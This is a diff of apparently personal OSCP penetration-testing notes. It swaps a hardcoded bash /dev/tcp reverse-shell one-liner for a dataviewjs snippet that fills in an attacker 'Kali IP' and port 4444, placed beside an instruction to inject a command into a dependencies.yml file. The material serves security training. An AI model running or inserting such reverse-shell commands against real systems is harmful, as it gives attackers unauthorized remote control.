@@ -30,10 +30,12 @@ vi dependencies.yml
 ```
 
 Replace "id" at git-set with your command. 
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-```
-/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.66/4444 0>&1'
-```
+const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;
 
+dv.paragraph("```bash\n" + command + "\n```");
+```
 sample from [[Reverse Shell Resources]].
 
